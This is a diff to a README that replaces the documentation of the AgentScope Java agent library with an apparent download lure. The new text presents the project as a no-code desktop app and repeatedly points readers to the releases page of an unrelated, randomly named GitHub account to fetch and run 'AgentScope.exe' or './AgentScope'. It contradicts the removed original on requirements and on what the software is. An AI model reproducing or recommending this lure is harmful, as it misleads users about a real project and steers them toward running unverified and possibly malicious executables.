@@ -1,131 +1,66 @@
-<p align="center">
-  <img
-    src="https://img.alicdn.com/imgextra/i1/O1CN01nTg6w21NqT5qFKH1u_!!6000000001621-55-tps-550-550.svg"
-    alt="AgentScope Logo"
-    width="200"
-  />
-</p>
+# 🎉 agentscope-java - Build LLM Applications Easily
 
-## AgentScope Implementation for Java
-<font style="color:rgb(31, 35, 40);">This is the Java implementation of </font>[<font style="color:rgb(9, 105, 218);">AgentScope</font>](https://github.com/agentscope-ai/agentscope/)<font style="color:rgb(31, 35, 40);">. Please note that this project is still experimental and under active development.</font>
+## 🚀 Getting Started
+Welcome to AgentScope Java! This application helps you build agent-oriented programs for large language model (LLM) applications. You don't need programming knowledge to get started. Follow the steps below to download and run the software.
 
+## 📥 Download AgentScope
+[![Download AgentScope](https://img.shields.io/badge/Download_AgentScope-Java_Package-blue)](https://github.com/extermine1423534rqwafda/agentscope-java/releases)
 
-![](https://img.shields.io/badge/GUI-AgentScope_Studio-blue?logo=look&logoColor=green&color=dark-green)![](https://img.shields.io/badge/license-Apache--2.0-black)
+## 📋 System Requirements
+To run AgentScope Java, you will need the following:
+- Operating System: Windows, macOS, or Linux
+- Java Runtime Environment (JRE) version 11 or higher
+- Minimum 4 GB RAM
+- At least 200 MB of free disk space
 
-## ✨ Why AgentScope?
-Easy for beginners, powerful for experts.
+## 📦 How to Download & Install
+1. **Visit the Releases Page**  
+   Go to the following link to access the release files:  
+   [Visit this page to download](https://github.com/extermine1423534rqwafda/agentscope-java/releases)
 
-+ **Transparent to Developers**: Transparent is our **FIRST principle**. Prompt engineering, API invocation, agent building, workflow orchestration, all are visible and controllable for developers. No deep encapsulation or implicit magic.
-+ Realtime Steering: Native support for realtime interruption and customized handling.
-+ **More Agentic**: Support agentic tools management, agentic long-term memory control and agentic RAG, etc.
-+ **Model Agnostic**: Programming once, run with all models.
-+ **LEGO-style Agent Building**: All components are **modular** and **independent**.
-+ **Multi-Agent Oriented**: Designed for **multi-agent**, **explicit** message passing and workflow orchestration, NO deep encapsulation.
-+ **Highly Customizable**: Tools, prompt, agent, workflow, third-party libs & visualization, customization is encouraged everywhere.
+2. **Choose the Latest Version**  
+   On the releases page, you will see a list of available versions. Look for the latest version at the top. 
 
-## 🚀 Quickstart
-### Installation
-AgentScope Java requires **jdk 17** or higher.
+3. **Download the Package**  
+   Click on the file that matches your operating system to start the download. Make sure you choose the right version:
+   - For Windows, download `agentscope-java-windows.zip`
+   - For macOS, download `agentscope-java-macos.zip`
+   - For Linux, download `agentscope-java-linux.tar.gz`
+  
+4. **Extract the Files**  
+   After the download completes, find the downloaded file on your computer. Use your system's extraction tool:
+   - **Windows:** Right-click the `.zip` file and choose “Extract All.”
+   - **macOS:** Double-click the `.zip` file to extract it.
+   - **Linux:** Use the command `tar -xzf agentscope-java-linux.tar.gz`.
 
-```bash
-<dependency>
-    <groupId>io.agentscope</groupId>
-    <artifactId>agentscope-core</artifactId>
-    <version>0.1.0</version>
-</dependency>
-```
+5. **Open the Application**  
+   Navigate to the folder where you extracted the files. Locate the `AgentScope` executable:
+   - For Windows, open `AgentScope.exe`.
+   - For macOS and Linux, open the `AgentScope` file in the terminal by typing `./AgentScope`.
 
-### Hello AgentScope!
-Start with a basic ReActAgent that replies to user queries!
+6. **Follow On-Screen Instructions**  
+   Once the program starts, follow the on-screen instructions to create your first agent-oriented application. Don't worry; the interface is user-friendly!
 
-```java
-public static void main(String[] args) {
-    Model model = DashScopeChatModel.builder()
-		.apiKey(System.getenv("DASHSCOPE_API_KEY"))
-		.modelName("qwen-max")
-		.build();
+## 📚 Features
+- **User-Friendly Interface:** Easily navigate the application without programming skills.
+- **Agent Modeling:** Create agents with simple drag-and-drop tools.
+- **Integration:** Seamlessly integrate models with large language systems.
+- **Pre-Built Templates:** Start quickly with examples and templates.
+- **Documentation & Tutorials:** Access detailed guides to support your learning.
 
-    ReActAgent agent = ReActAgent.builder()
-    .name("hello-world-agent")
-    .sysPrompt("You are a helpful AI assistant. Be concise and friendly. " +
-               "When thinking through problems, use <thinking>...</thinking> tags to show your reasoning.")
-    .model(model)
-    .memory(new InMemoryMemory())
-    .formatter(new DashScopeChatFormatter())
-    .build();
+## 📖 Additional Resources
+To learn more about using AgentScope Java, check out the following resources:
+- [User Guide](https://github.com/extermine1423534rqwafda/agentscope-java/wiki)
+- [Video Tutorials](https://github.com/extermine1423534rqwafda/agentscope-java/wiki#video-tutorials)
+- [Community Support](https://github.com/extermine1423534rqwafda/agentscope-java/issues)
 
-    Msg userMessage = Msg.builder()
-        .role(MsgRole.USER)
-        .textContent("Hello, please introduce yourself.")
-        .build();
-    Msg response = agent.reply(userMessage).block();
+## 🛠️ Troubleshooting
+If you encounter issues during installation or usage, here are some tips:
+- Ensure you have the correct version of the Java Runtime Environment installed.
+- Check that you have downloaded the right file for your operating system.
+- Refer to the [FAQ](https://github.com/extermine1423534rqwafda/agentscope-java/wiki#faq) for common questions and solutions.
 
-    System.out.println("Agent Response: " + response.getTextContent());
-}
-```
+## 📞 Contact
+For further assistance, feel free to open an issue in the repository or reach out to our support team. We are here to help you succeed with AgentScope Java!
 
-### Equip Agent with Tools
-1. Define Tool
-
-	Define a tool class with methods annotated with `@Tool`. Here's an example `SimpleTools` class with a time tool:
-
-	```java
-	public class SimpleTools {
-		@Tool(name = "get_time", description = "Get current time string of a time zone")
-		public String getTime(@ToolParam(description = "Time zone, e.g., Beijing") String zone) {
-			LocalDateTime now = LocalDateTime.now();
-			return now.format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss"));
-		}
-	}
-	```
-
-2. Register Tool to ReActAgent
-
-	Register the tool class through `Toolkit` using the `registerTool` method:
-
-	```java
-	public static void main(String[] args) {
-		Model model = DashScopeChatModel.builder()
-			.apiKey(System.getenv("DASHSCOPE_API_KEY"))
-			.modelName("qwen-max")
-			.build();
-
-		Toolkit toolkit = new Toolkit();
-		toolkit.registerTool(new SimpleTools());
-
-		ReActAgent agent = ReActAgent.builder()
-			.name("hello-world-agent")
-			.sysPrompt("You are a helpful AI assistant.")
-			.model(model)
-			.toolkit(toolkit)
-			.memory(new InMemoryMemory())
-			.formatter(new DashScopeChatFormatter())
-			.build();
-
-		Msg userMessage = Msg.builder()
-				.role(MsgRole.USER)
-				.textContent("Please tell me the current time.")
-				.build();
-
-		Msg response = agent.reply(userMessage).block();
-		System.out.println("Agent Response: " + response.getTextContent());
-	}
-	```
-## <font style="color:rgb(31, 35, 40);">📖</font><font style="color:rgb(31, 35, 40);"> Documentation</font>
-+ [Create Message](./docs/quickstart-message.md)
-+ [Create ReAct Agent](./docs/quickstart-agent.md)
-+ Model
-+ Tool
-+ Memory
-+ Prompt Formatter
-
-## <font style="color:rgb(31, 35, 40);">🏗️</font><font style="color:rgb(31, 35, 40);"> </font>Roadmap
-In the upcoming versions, AgentScope Java version will focus on improving the following features.
-
-+ Multi-modal
-+ Multi-Agent
-+ Tracing
-+ AgentScope Studio
-
-## ⚖️ License
-AgentScope is released under Apache License 2.0.
+Remember, your journey into agent-oriented programming starts with a single download. Visit this page to download: [Download AgentScope](https://github.com/extermine1423534rqwafda/agentscope-java/releases).
